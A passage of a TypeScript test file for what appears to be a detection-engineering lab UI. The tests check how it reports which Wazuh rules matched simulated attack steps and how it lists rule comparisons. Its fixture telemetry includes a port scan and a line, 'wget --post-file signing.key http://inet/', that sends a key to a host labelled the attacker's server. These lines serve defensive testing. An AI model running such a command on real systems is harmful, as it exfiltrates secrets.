    const matched = await screen.findByRole("region", { name: "Rules that matched it" });
    expect(groupsOf(matched)).toEqual([
      ["Published rules below alert level", []],
      ["The lab's own rules that matched", []],
      ["Matched only the line that starts the test, which never counts", ["Execution Of Script Located In Potentially Suspicious Directory"]],
    ]);
    // The published rule under them matched only that line: the empty group says it matched nothing the test itself did, not that none matched.
    expect(matched).toHaveTextContent("No published rule matched what the test itself did, at any level.");
    expect(matched).not.toHaveTextContent("No published rule matched it, at any level.");
    expect(matched).toHaveTextContent("None of the lab's own rules matched it.");
  });

  it("says no published rule matched a seen test nothing matched at all", async () => {
    // Test 8 (step 11) of the run on one Linux machine: seen, and no rule matched it, not even on its launcher line.
    mount("11", { recording: shipped("lab-linux-host"), pairs: [] });
    const matched = await screen.findByRole("region", { name: "Rules that matched it" });
    expect(groupsOf(matched)).toEqual([
      ["Published rules below alert level", []],
      ["The lab's own rules that matched", []],
    ]);
    expect(matched).toHaveTextContent("No published rule matched it, at any level.");
    expect(matched).toHaveTextContent("None of the lab's own rules matched it.");
  });

  it("says none of the lab's own rules matched what the test itself did when one of them matched only its launcher line", async () => {
    const base = smallRecording();
    const launcherOnly = alert("l1", "2", 3.2, ["2-2"], { detector: "lab", counts: false, launcher_only: true, rule: { id: "lab-medium", title: "A Lab Rule Below Alert Level", level: "medium", origin: "lab" } });
    // Step 2 with only that match: nothing published, nothing of the lab's on what the test did.
    const recording: Recording = { ...base, alerts: [...base.alerts.filter((item) => item.step !== "2"), launcherOnly] };
    mount("2", { recording, pairs: [] });
    const matched = await screen.findByRole("region", { name: "Rules that matched it" });
    expect(groupsOf(matched)).toEqual([
      ["Published rules below alert level", []],
      ["The lab's own rules that matched", []],
      ["Matched only the line that starts the test, which never counts", ["A Lab Rule Below Alert Level"]],
    ]);
    expect(matched).toHaveTextContent("None of the lab's own rules matched what the test itself did.");
    expect(matched).not.toHaveTextContent("None of the lab's own rules matched it.");
    // No published rule matched at all, so that group keeps its sentence.
    expect(matched).toHaveTextContent("No published rule matched it, at any level.");
  });

  it("for a step of a range, says that its sensors and rules are set in the range's spec and images, not in the lab's folders", async () => {
    const RULES = "Wazuh 4.14.10 stock rules with the lab's decoder for snoopy, on manager";
    const base = fixture({
      steps: [
        step("1", 1, 2, { title: "Port Scan", host: "build", from: "web", outcome: "seen", visibility: { answer: "telemetry only", basis: "1 archived event tied to the step", events: 1 } }),
        step("2", 3, 4, { title: "Extract passwords with grep", host: "web", outcome: "unseen", visibility: { answer: "no telemetry", basis: "no archived event tied to the step", events: 0 } }),
        step("3", 5, 6, { title: "Exfiltration Over Alternative Protocol - HTTP", host: "inet", from: "web", outcome: "seen", visibility: { answer: "telemetry only", basis: "1 archived event tied to the step", events: 1 } }),
      ],
      events: [
        { ...event("1-1", "1", 1.5), host: "build", sensor: "wazuh-agent-build", kind: "sshd line", text: "banner exchange: invalid format", tied_by: "address" },
        { ...event("1-2", "1", 1.6), host: "web", sensor: "wazuh-agent-web", kind: "process start", text: "nmap -sT build", tied_by: "session" },
        { ...event("3-1", "3", 5.5), host: "web", sensor: "wazuh-agent-web", kind: "process start", text: "wget --post-file signing.key http://inet/", tied_by: "session" },
      ],
      alerts: [alert("r1", "1", 1.5, ["1-1"], { host: "build", counts: false, rule: { id: "5710", title: "sshd: Attempt to login using a non-existent user", level: "low", origin: "pinned" } })],
      when: "live",
    });
    const range: Recording = {
      ...base,
      id: "range-1",
      kind: "attack path",
      network: {
        hosts: [
          { id: "web", name: "web", role: "web application", kind: "host" },
          { id: "build", name: "build", role: "build server", kind: "host" },
          { id: "inet", name: "inet", role: "attacker's server", kind: "host" },
          { id: "manager", name: "manager", role: "Wazuh manager", kind: "defense" },
        ],
        sensors: [
          { id: "wazuh-agent-web", name: "Wazuh agent 4.14.10", host: "web", records: "the lines of /var/log/auth.log" },
          { id: "wazuh-agent-build", name: "Wazuh agent 4.14.10", host: "build", records: "the lines of /var/log/auth.log" },
        ],
        detectors: [{ id: "pinned", name: RULES, rules: 8454, when: "live" }],
      },
    };

    const seen = mount("1", { recording: range, pairs: [] });
    const start = await screen.findByRole("region", { name: "Where to start" });
    // A step of an attack path is named and counted as a step, as the live view names it.
    expect(start).toHaveTextContent('A sensor recorded this step, but no rule raised an alert. To alert here, start from the rule "sshd: Attempt to login using a non-existent user": it matched this step at low level.');
    expect(screen.getByText("step 1", { exact: true })).toBeVisible();
    expect(await within(screen.getByRole("region", { name: /^What was already tried/ })).findByText("No comparison has moved this step yet.")).toBeVisible();
    expect(start).toHaveTextContent(`The rules that ran in this range were ${RULES}. The range has no rules of the lab's own yet.`);
    expect(start).toHaveTextContent("A new rule goes into the manager's image, which lab/bluefire_lab/range/build.py writes.");
    expect(start).not.toHaveTextContent("lab/rules/linux/");
    // Both agents that recorded the step, each named by its host since they share a name: the scanned host's and the one it ran from.
    const recorded = screen.getByRole("region", { name: /^What was recorded/ });
    expect(within(recorded).getByRole("article", { name: "Sensor Wazuh agent on build" })).toHaveTextContent("1 event of this step");
    expect(within(recorded).getByRole("article", { name: "Sensor Wazuh agent on web" })).toHaveTextContent("nmap -sT build");
    const draft = screen.getByRole("textbox", { name: "Your rule" });
    expect(draft).toHaveAccessibleDescription(/The range has no folder for rules of the lab's own yet, so this draft has no file to go in/);
    expect(draft).toHaveAccessibleDescription(/lab\/bluefire_lab\/range\/build\.py/);
    expect(draft).not.toHaveAccessibleDescription(/lab\/rules\/linux\//);
    const again = screen.getByRole("region", { name: "Running it again" });
    expect(again).toHaveTextContent("What a sensor reads is set in the range's spec under lab/range/. A rule goes into the image of the host manager, which lab/bluefire_lab/range/build.py writes.");
    expect(again).toHaveTextContent("Its CI builds the range, runs the path through it again and keeps the new recording in the run's artifact.");
    expect(again).not.toHaveTextContent("lab/sensors/");
    expect(again).not.toHaveTextContent("lab/rules/linux/");
    seen.view.unmount();

    const unseen = mount("2", { recording: range, pairs: [] });
    const sensorStart = await screen.findByRole("region", { name: "Where to start" });
    // No launcher in the recording's words for this step, so none in the page's.
    expect(sensorStart).toHaveTextContent("Nothing of this step was recorded. Start with a sensor's settings");
    expect(sensorStart).not.toHaveTextContent("launcher");
    expect(screen.getByRole("heading", { level: 3, name: /^Other steps of the same technique in this run/ })).toBeVisible();
    expect(sensorStart).toHaveTextContent("In this range each sensor is a Wazuh agent built into its host's image. The range's spec under lab/range/ sets what it reads: the logs and folders under defense.watch, and each host's own watch.");
    expect(sensorStart).not.toHaveTextContent("lab/sensors/");
    unseen.view.unmount();

    // Whatever the recording calls its rule set, with the host in its name or not, the sentences read as one
    // passage, and the one after the rule set's name speaks of the manager's image without naming the host again.
    for (const name of [RULES, "Wazuh 4.14.10 stock rules"]) {
      const named: Recording = { ...range, network: { ...range.network, detectors: [{ id: "pinned", name, rules: 8454, when: "live" }] } };
      const shown = mount("1", { recording: named, pairs: [] });
      const where = await screen.findByRole("region", { name: "Where to start" });
      const passage = within(where).getByText((_, element) => element?.tagName === "P" && (element.textContent ?? "").startsWith("The rules that ran in this range"));
      expect(passage.textContent).toBe(`The rules that ran in this range were ${name}. The range has no rules of the lab's own yet. A new rule goes into the manager's image, which lab/bluefire_lab/range/build.py writes.`);
      expect(passage).not.toHaveTextContent(/the host manager|image of manager/);
      shown.view.unmount();
    }

    // A step whose host has no agent, recorded by the agent of the host it ran from. No published rule matched it, so no rule is named.
    mount("3", { recording: range, pairs: [] });
    expect(await screen.findByRole("region", { name: "Where to start" })).toHaveTextContent("A sensor recorded this step, but no rule raised an alert. Start with a rule that matches what the sensor recorded.");
    const goal = await screen.findByRole("region", { name: /^What was recorded/ });
    expect(within(goal).getByRole("article", { name: "Sensor Wazuh agent on web" })).toHaveTextContent("wget --post-file signing.key http://inet/");
  });

  it("says in the model's place one of two fixed texts by the configured provider's kind, read from the configuration", async () => {
    expect(modelWords(null)).toBe("No model is connected. Nothing was sent.");
    expect(modelWords("deterministic")).toBe("No model is connected. Nothing was sent.");
    expect(modelWords("openai_responses")).toBe("A model is configured, but BlueFire does not ask models for rules yet. Nothing was sent.");
    expect(modelWords("chat_completions")).toBe("A model is configured, but BlueFire does not ask models for rules yet. Nothing was sent.");
    expect(activeProviderKind(catalog(null))).toBeNull();
    expect(activeProviderKind(catalog("chat_completions"))).toBe("chat_completions");

    const check = vi.spyOn(api, "checkAIProvider");
    for (const kind of [null, "deterministic", "openai_responses"]) {
      const { view, catalogFetch } = mount("2", { kind });
      const place = await screen.findByRole("complementary", { name: "The model's place" });
      expect(await within(place).findByText(modelWords(kind))).toBeVisible();
      expect(within(place).getByRole("link", { name: "Model connection settings" })).toHaveAttribute("href", "/settings#model-connection");
      // The editor stays empty whatever the model connection, and nothing asks a provider anything.
      expect(screen.getByRole("textbox", { name: "Your rule" })).toHaveValue("");
      expect(catalogFetch).toHaveBeenCalled();
      view.unmount();
    }
    expect(check).not.toHaveBeenCalled();
  });

  it("says the model connection could not be read when the configuration does not answer, never that none is connected", async () => {
    mount("2", { catalogFails: true });
    const place = await screen.findByRole("complementary", { name: "The model's place" });
    expect(await within(place).findByText("The model connection could not be read from the configuration. Nothing was sent.")).toBeVisible();
    expect(place).not.toHaveTextContent("No model is connected");
  });

  it("lists a comparison that moved the step, as the pair's page words it, with links to it and to the same step in the after run", async () => {
    mount("1");
    const tried = await screen.findByRole("region", { name: /^What was already tried/ });
    const [watch, elsewhere] = await within(tried).findAllByRole("listitem");
    if (!watch || !elsewhere) throw new Error("Both comparisons should be listed.");
    // The change by the name the turn has on the Runs screen and its own page.
    expect(watch).toHaveTextContent("New auditd settings");
    expect(watch).toHaveTextContent("This run is the one before the change.");
    expect(watch).toHaveTextContent("Imported");
    // The price in the words the comparison's card on Runs gives it.
    expect(within(watch).getByText("2 published rules alert on ordinary activity, before and after")).toHaveClass("cmp-price");
    // The price stands on a line of its own under the result, keyed as the cards key it and the comparison's page heads it, so the two never read as one sentence.
    const priceLine = within(watch).getByText("2 published rules alert on ordinary activity, before and after").closest("p");
    expect(priceLine?.textContent).toBe("What it cost2 published rules alert on ordinary activity, before and after");
    const resultLine = within(watch).getByText("better").closest("p");
    expect(resultLine).not.toBe(priceLine);
    expect(resultLine).not.toHaveTextContent("ordinary activity");
    if (!resultLine || !priceLine) throw new Error("The result and the price should each have a line.");
    expect(resultLine.compareDocumentPosition(priceLine) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();
    expect(within(watch).getByRole("link", { name: "Open the comparison at this step" })).toHaveAttribute("href", "/runs/compared/0000000000000001?step=1");
    expect(within(watch).getByRole("link", { name: "Open the same step in the after run" })).toHaveAttribute("href", `/runs/recorded/rec-2/${OTHER_SHA}?step=1&at=0&paused=1&mode=analyse&select=1`);
    // A comparison of other runs, tied by the step's stable id, and said to be of another run.
    expect(elsewhere).toHaveTextContent("Another run of the same list, not this one, with the same published test. Tied by the step's id 1");
    expect(within(elsewhere).queryByRole("link", { name: "Open the same step in the after run" })).toBeNull();
    // The price in plain words on the step's line, and the comparison's own words, with the lab's line, one click away.
    expect(within(elsewhere).getByText("Not counted: the lab keeps its own rules' matches on ordinary activity out of the recording")).toHaveClass("cmp-price");
    expect(elsewhere).not.toHaveTextContent("None in this run");
    expect(within(elsewhere).getByText(/The run accepted 1 of the 2 rules written in this repository/)).not.toBeVisible();
    await userEvent.setup().click(within(elsewhere).getByText("The comparison's own words"));
    expect(within(elsewhere).getByText(/The run accepted 1 of the 2 rules written in this repository/)).toBeVisible();
  });

  it("gives the price of a new rule the run after kept as the comparison's page does: none in this run, not the lab's raw line", async () => {
    mount("1", { pairs: [keptRule(ELSEWHERE)] });
    const tried = await screen.findByRole("region", { name: /^What was already tried/ });
    const [line] = await within(tried).findAllByRole("listitem");
    if (!line) throw new Error("The comparison should be listed.");
    expect(within(line).getByText("None in this run: the new rule alerted on no ordinary activity, which the lab requires before it keeps a rule")).toHaveClass("cmp-price");
    // The lab's own line stays, in the comparison's own words behind one click.
    expect(within(line).getByText(/price not counted: the lab's rules that matched ordinary activity/)).not.toBeVisible();
  });

  it("finds the comparison of one run evaluated with two rule sets from either file the id holds", async () => {
    const both = delta("0000000000000008", { id: "rec-1", sha256: SHA }, { id: "rec-1", sha256: OTHER_SHA }, [movedStep("2", "seen", "alerted", MOVED)]);
    const twice = { summary: { ...both.summary, one_run: true }, delta: { ...both.delta, one_run: true } };
    // The id's own address shows its first file, the rules before; the second file is opened by its SHA-256.
    for (const [file, words] of [[undefined, "This run, with the rules from before the change."], [OTHER_SHA, "This run, with the rules from after the change."]] as const) {
      const { view } = mount("2", { pairs: [twice], ...(file ? { file } : {}) });
      const tried = await screen.findByRole("region", { name: /^What was already tried/ });
      const [line, ...more] = await within(tried).findAllByRole("listitem");
      if (!line) throw new Error("The comparison should be listed.");
      expect(more).toHaveLength(0);
      expect(line).toHaveTextContent("one run evaluated with two rule sets");
      expect(line).toHaveTextContent(words);
      expect(within(line).getByRole("link", { name: "Open the comparison at this step" })).toHaveAttribute("href", "/runs/compared/0000000000000008?step=2");
      if (file) {
        expect(within(line).queryByRole("link", { name: "Open the same step with the rules after" })).toBeNull();
      } else {
        expect(within(line).getByRole("link", { name: "Open the same step with the rules after" })).toHaveAttribute("href", `/runs/recorded/rec-1/${OTHER_SHA}?step=2&at=0&paused=1&mode=analyse&select=2`);
      }
      view.unmount();
    }
  });

  it("in an older recording, ties a comparison of later runs of the same list to a test by its published id, and says it is another run", async () => {
    mount("1", { recording: smallRecording({ stable: false }), pairs: [PLAIN, VARIANT, HARDENED, WITH_ARGUMENTS, OTHER_LIST] });
    const tried = await screen.findByRole("region", { name: /^What was already tried/ });
    const lines = await within(tried).findAllByRole("listitem");
    // Only the comparison that moved the test as the list gives it: not a rerun with changed arguments, not a hardened rerun, not the test run with arguments, not another list.
    expect(lines).toHaveLength(1);
    const [line] = lines;
    if (!line) throw new Error("The plain test's comparison should be listed.");
    expect(line).toHaveTextContent("Another run of the same list, not this one, with the same published test as the list runs it. Tied by the published test's id cbf506a5");
    expect(within(line).getByText("cbf506a5")).toHaveAttribute("title", ECHO_GUID);
    expect(within(line).getByRole("link", { name: "Open the comparison at this step" })).toHaveAttribute("href", "/runs/compared/0000000000000003?step=test%3Acbf506a5");
    expect(tried).not.toHaveTextContent("older than the ids");
  });

  it("ties no comparison of other runs to a step of an older recording that is not the only plain run of its published test", async () => {
    const older = smallRecording({ stable: false });
    // A second run of the same published test in the role test: which one a later run's id names cannot be told.
    const twice = { ...older, steps: [...older.steps, step("5", 9, 10, { title: "Clear Bash history (echo)", test: ECHO, technique: { id: "T1070.003" }, outcome: "seen" })] };
    mount("1", { recording: twice, pairs: [PLAIN] });
    const tried = await screen.findByRole("region", { name: /^What was already tried/ });
    expect(await within(tried).findByText("No comparison has moved this test yet.")).toBeVisible();
    expect(tried).toHaveTextContent("This recording is older than the ids that tie a test like this one across runs");
    expect(within(tried).queryAllByRole("listitem")).toHaveLength(0);
  });

  it("goes back to the moment the reader came from, or to the step's detail when the address has none", async () => {
    mount("2", { search: "?step=2&at=0.4&paused=1" });
    expect(await screen.findByRole("link", { name: "Back to the run" })).toHaveAttribute("href", "/runs/recorded/rec-1?step=2&at=0.4&paused=1");
    expect(backPath("rec-1", OTHER_SHA, "2", new URLSearchParams())).toBe(`/runs/recorded/rec-1/${OTHER_SHA}?step=2&at=0&paused=1&mode=analyse&select=2`);
  });
});

describe("which comparisons are read for a step", () => {
  it("reads those of this file, and of other runs of the same list only when the step can be tied and the comparison lists it", () => {
    const list = { kind: "test list", title: summaryOf("rec-1").title };
    const here = { id: "rec-1", sha256: SHA, stable: true, list };
    const stable = (id: string) => ({ by: "stable id", id } as const);
    expect(candidates(here, stable("1"), [WATCH.summary, ELSEWHERE.summary]).map((item) => item.id)).toEqual([WATCH.summary.id, ELSEWHERE.summary.id]);
    expect(candidates(here, stable("2"), [WATCH.summary, ELSEWHERE.summary]).map((item) => item.id)).toEqual([WATCH.summary.id]);
    expect(candidates({ ...here, stable: false }, null, [WATCH.summary, ELSEWHERE.summary]).map((item) => item.id)).toEqual([WATCH.summary.id]);
    expect(candidates(here, stable("test:cbf506a5"), [PLAIN.summary, OTHER_LIST.summary]).map((item) => item.id)).toEqual([PLAIN.summary.id]);
    // Another file of the same id, as one run evaluated twice keeps, is not this file.
    expect(triedFor({ id: "rec-1", sha256: OTHER_SHA, stable: false }, "1", null, [WATCH])).toEqual([]);
    // A running recording has no file to be named by.
    expect(triedFor({ id: "rec-1", stable: false }, "1", null, [WATCH])).toEqual([]);
  });

  it("ties a step of an older recording only when it is the one plain run of its published test", () => {
    const older = smallRecording({ stable: false });
    const [echo] = older.steps;
    if (!echo) throw new Error("The recording should have its steps.");
    expect(tieOf(older, echo)).toEqual({ by: "published test", id: "test:cbf506a5", guid: ECHO_GUID });
    expect(tieOf(older, { ...echo, role: "variant" })).toBeNull();
    expect(tieOf(older, { ...echo, role: "hardened" })).toBeNull();
    // A step that does not name its published test.
    const unnamed = step("1", 1, 2, { title: echo.title, technique: echo.technique });
    expect(tieOf({ ...older, steps: [unnamed, ...older.steps.slice(1)] }, unnamed)).toBeNull();
    // A recording with stable ids ties by the step's own id.
    expect(tieOf(smallRecording(), echo)).toEqual({ by: "stable id", id: "1" });
  });
});
